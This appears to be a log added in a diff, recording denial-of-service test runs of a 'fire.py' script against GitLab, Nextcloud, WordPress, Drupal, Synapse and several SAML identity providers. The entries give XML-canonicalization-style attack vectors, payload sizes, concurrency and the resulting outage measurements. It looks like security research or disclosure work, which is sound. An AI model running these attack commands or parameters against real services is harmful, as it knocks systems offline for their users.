@@ -1,0 +1,119 @@
+python3 fire.py --target authentic2-idp --vector flattr --size 100000 --probe --max-inflight 25 --duration 300
+# requests: 46 completed  median=202.09s  max=417.69s  codes={200: 46}
+# probes [ramp    ]:  12 sent, avg request=  0.16s, failed=1/12 (8%)
+# probes [sustain ]:   9 sent, avg request=    n/a, failed=9/9 (100%)
+# probes [recovery]:  97 sent, avg request=  0.36s, failed=2/97 (2%)
+# volume: 72.9 MB (72944868 bytes) sent over 460.7s (first request -> last completion) = 0.0013 Gbps
+
+python3 fire.py --target ssp-idp --vector Wreckoncile --size 400 --probe --max-inflight 200 --duration 300
+# 30+2 second processing limit
+# ---------
+# 60 waves fired (350 requests); draining in-flight (~200) -- probe keeps running to show recovery...
+# requests: 350 completed  median=227.37s  max=420.19s  codes={'ERR ConnectionError/RemoteDisconnected': 350}
+# probes [ramp    ]:   9 sent, avg request=  1.45s, failed=1/9 (11%)
+# probes [sustain ]:  10 sent, avg request= 18.07s, failed=10/10 (100%)
+# probes [recovery]:  83 sent, avg request=  0.42s, failed=4/83 (5%)
+# volume: 140.6 MB (140636300 bytes) sent over 518.4s (first request -> last completion) = 0.0022 Gbps
+
+python3 fire.py --target ssp-sp --vector flattr --size 50000 --max-inflight 200 --duration 300 --prob
+# 30+2 second processing limit
+# ---------
+# 60 waves fired (350 requests); draining in-flight (~200) -- probe keeps running to show recovery...
+# requests: 350 completed  median=224.01s  max=437.48s  effective(>=1s)=3  backend-fail=347  codes={200: 3, 'ERR ConnectionError/RemoteDisconnected': 347}
+# probes [ramp    ]:   8 sent, avg served=  1.88s, failed=1/8 (12%), unavailable 30/46s (66% of time)  [ERR ReadTimeout/TimeoutErrorx1]
+# probes [sustain ]:  11 sent, avg served=  0.20s, failed=10/11 (91%), unavailable 276/277s (100% of time)  [ERR ReadTimeout/TimeoutErrorx8, slow(>10s)x2]
+# probes [recovery]:  88 sent, avg served=  0.20s, failed=4/88 (5%), unavailable 113/196s (57% of time)  [ERR ReadTimeout/TimeoutErrorx3, slow(>10s)x1]
+# volume: 276.0 MB (276048850 bytes) sent over 518.6s (first request -> last completion) = 0.0043 Gbps
+
+python3 fire.py --target gitlab --vector cianide --n 100 --k 41000 --probe --max-inflight 20 --duration 300
+# SIZE=small
+# 60 second processing limit
+# ---------
+# 60 waves fired (94 requests); draining in-flight (~0) -- probe keeps running to show recovery...
+# requests: 94 completed  median=3.39s  max=11.51s  effective(>=1s)=87  backend-fail=94  codes={502: 94}
+# probes [ramp    ]:  78 sent, avg served=  5.34s, failed=76/78 (97%)  [HTTP 502x76]
+# probes [sustain ]: 200 sent, avg served=  1.31s, failed=182/200 (91%)  [HTTP 502x182]
+# volume: 23.6 MB (23632634 bytes) sent over 283.4s (first request -> last completion) = 0.0007 Gbps
+
+python3 fire.py --target gitlab --vector cianide --n 2000 --k 2000 --probe --max-inflight 20 --duration 300
+# SIZE=small
+# 60 second processing limit
+# ---------
+# 60 waves fired (67 requests); draining in-flight (~0) -- probe keeps running to show recovery...
+# requests: 67 completed  median=2.65s  max=4.52s  effective(>=1s)=60  backend-fail=67  codes={502: 67}
+# probes [ramp    ]:  10 sent, avg served=  3.08s, failed=8/10 (80%)  [HTTP 502x8]
+# probes [sustain ]: 267 sent, avg served=  3.52s, failed=261/267 (98%)  [HTTP 502x261]
+# volume: 3.8 MB (3805265 bytes) sent over 284.0s (first request -> last completion) = 0.0001 Gbps
+
+python3 fire.py --target gitlab --vector cianide --size 2000 --probe --max-inflight 100 --duration 300
+# SIZE=medium
+# 60 second processing limit
+# ---------
+# 60 waves fired (844 requests); draining in-flight (~71) -- probe keeps running to show recovery...
+# requests: 844 completed  median=29.76s  max=85.56s  effective(>=1s)=0  backend-fail=844  codes={500: 8, 502: 836}
+# probes [ramp    ]:   6 sent, avg served=  0.44s, failed=1/6 (17%)  [slow(>10s)x1]
+# probes [sustain ]:  44 sent, avg served=  0.66s, failed=11/44 (25%)  [slow(>10s)x6, ERR ReadTimeout/TimeoutErrorx5]
+# probes [recovery]:  16 sent, avg served=  0.17s, failed=0/16 (0%)
+# volume: 47.9 MB (47934980 bytes) sent over 328.7s (first request -> last completion) = 0.0012 Gbps
+
+python3 fire.py --target synapse --vector c14n-exc --size 100000 --prob --max-inflight 2 --duration 300
+# single-threaded, no payload limit, no processing limit:
+# cianide @ @N=35K -> 1.2MB payload -> 13s; N=80K -> 3MB payload -> 80s; N=300K -> 11.9MB payload -> unavailable for over 40 min 
+# flattr @ N=80K -> 1.2MB payload -> 26s; N=200K -> 3.2MB -> 198s
+# ---------
+# 60 waves fired (4 requests); draining in-flight (~2) -- probe keeps running to show recovery...
+# requests: 4 completed  median=277.49s  max=278.38s  effective(>=1s)=4  backend-fail=0  codes={400: 4}
+# probes [ramp    ]:   2 sent, avg served=  0.05s, failed=1/2 (50%), unavailable 30/31s (97% of time)  [ERR ReadTimeout/TimeoutErrorx1]
+# probes [sustain ]:  12 sent, avg served=  0.04s, failed=10/12 (83%), unavailable 276/278s (99% of time)  [ERR ReadTimeout/TimeoutErrorx8, slow(>10s)x2]
+# probes [recovery]:  10 sent, avg served=  0.04s, failed=9/10 (90%), unavailable 249/250s (100% of time)  [ERR ReadTimeout/TimeoutErrorx7, slow(>10s)x2]
+# volume: 15.4 MB (15447744 bytes) sent over 558.4s (first request -> last completion) = 0.0002 Gbps
+
+python3 fire.py --target nextcloud --vector c14n-exc --size 70000 --max-inflight 152 --duration 300 --prob
+# seemingly no time limit, no payload limit: c14n-exc N=120K -> 4.5MB -> 229s hold
+# ---------
+# 60 waves fired (152 requests); draining in-flight (~152) -- probe keeps running to show recovery...
+# requests: 152 completed  median=600.12s  max=600.19s  effective(>=1s)=0  backend-fail=152  codes={'ERR ReadTimeout/TimeoutError': 152}
+# probes [ramp    ]:  16 sent, avg served=  1.19s, failed=0/16 (0%), unavailable 0/26s (0% of time)
+# probes [sustain ]:  11 sent, avg served=  1.97s, failed=10/11 (91%), unavailable 300/302s (99% of time)  [ERR ReadTimeout/TimeoutErrorx10]
+# probes [recovery]:  10 sent, avg served=    n/a, failed=10/10 (100%), unavailable 300/300s (100% of time)  [ERR ReadTimeout/TimeoutErrorx10]
+# volume: 404.5 MB (404470936 bytes) sent over 626.2s (first request -> last completion) = 0.0052 Gbps
+# + at least another 600s
+
+python3 fire.py --target nextcloud --vector flattr --size 90000 --max-inflight 152 --duration 300 --prob
+# 60 waves fired (152 requests); draining in-flight (~152) -- probe keeps running to show recovery...
+# requests: 152 completed  median=600.11s  max=600.17s  effective(>=1s)=0  backend-fail=152  codes={'ERR ReadTimeout/TimeoutError': 152}
+# probes [ramp    ]:  17 sent, avg served=  1.07s, failed=0/17 (0%), unavailable 0/27s (0% of time)
+# probes [sustain ]:  10 sent, avg served=    n/a, failed=10/10 (100%), unavailable 300/300s (100% of time)  [ERR ReadTimeout/TimeoutErrorx10]
+# probes [recovery]:  10 sent, avg served=    n/a, failed=10/10 (100%), unavailable 300/300s (100% of time)  [ERR ReadTimeout/TimeoutErrorx10]
+# volume: 217.2 MB (217172888 bytes) sent over 625.9s (first request -> last completion) = 0.0028 Gbps
+# + another 600s
+
+python3 fire.py --target wordpress --vector cianide --size 2000 --max-inflight 170 --duration 300 --probe
+# 30+2 second processing limit; 
+# --------
+# 60 waves fired (303 requests); draining in-flight (~168) -- probe keeps running to show recovery...
+# requests: 303 completed  median=212.97s  max=429.35s  effective(>=1s)=0  backend-fail=303  codes={'ERR ConnectionError/RemoteDisconnected': 303}
+# probes [ramp    ]:  12 sent, avg served=  1.35s, failed=1/12 (8%), unavailable 30/51s (59% of time)  [ERR ReadTimeout/TimeoutErrorx1]
+# probes [sustain ]:  16 sent, avg served=  0.41s, failed=10/16 (62%), unavailable 268/274s (98% of time)  [ERR ReadTimeout/TimeoutErrorx6, slow(>10s)x4]
+# probes [recovery]: 122 sent, avg served=  0.17s, failed=1/122 (1%), unavailable 15/138s (11% of time)  [slow(>10s)x1]
+# volume: 17.2 MB (17189796 bytes) sent over 462.8s (first request -> last completion) = 0.0003 Gbps
+
+python3 fire.py --target authentik-sp --vector C14N1D3 --size 90000 --max-inflight 100 --duration 300 --probe
+# 2.5MiB payload limit
+# --------
+# 35 waves fired (191 requests); draining in-flight (~97) -- probe keeps running to show recovery...
+# requests: 191 completed  median=600.10s  max=600.17s  effective(>=5s)=1  backend-fail=97  codes={'ERR ReadTimeout/TimeoutError': 97, 405: 94}
+# probes [ramp    ]:   2 sent, avg served=  4.82s, failed=0/2 (0%), unavailable 0/10s (0% of time)
+# probes [sustain ]: 282 sent, avg served=  0.26s, failed=249/282 (88%), unavailable 258/291s (89% of time)  [bounced(<0.2s)x248, slow(>10s)x1]
+# probes [recovery]: 320 sent, avg served=  0.25s, failed=273/320 (85%), unavailable 272/319s (85% of time)  [bounced(<0.2s)x273]
+# volume: 484.6 MB (484560315 bytes) sent over 620.0s (first request -> last completion) = 0.0063 Gbps
+
+python3 fire.py --target drupal --vector cianide --size 2000 --max-inflight 170 --duration 300 --probe
+# 30+2 second processing limit; 
+# -------- 
+# 60 waves elapsed (358 requests fired; holds count as waves but fire nothing); draining in-flight (~166) -- probe keeps running to show recovery...
+# requests: 358 completed  median=194.82s  max=438.81s  effective(>=1s)=5  backend-fail=353  codes={'ERR ConnectionError/RemoteDisconnected': 296, 500: 57, 200: 5}
+# probes [ramp    ]:   6 sent, avg served=  0.06s, failed=3/6 (50%), unavailable 3/6s (50% of time)  [HTTP 500x3]
+# probes [sustain ]:  19 sent, avg served=  1.34s, failed=11/19 (58%), unavailable 289/306s (95% of time)  [ERR ReadTimeout/TimeoutErrorx7, slow(>10s)x4]
+# probes [recovery]: 130 sent, avg served=  0.11s, failed=4/130 (3%), unavailable 27/155s (18% of time)  [ERR ConnectionError/RemoteDisconnectedx3, slow(>10s)x1]
+# volume: 20.7 MB (20704214 bytes) sent over 467.0s (first request -> last completion) = 0.0004 Gbps
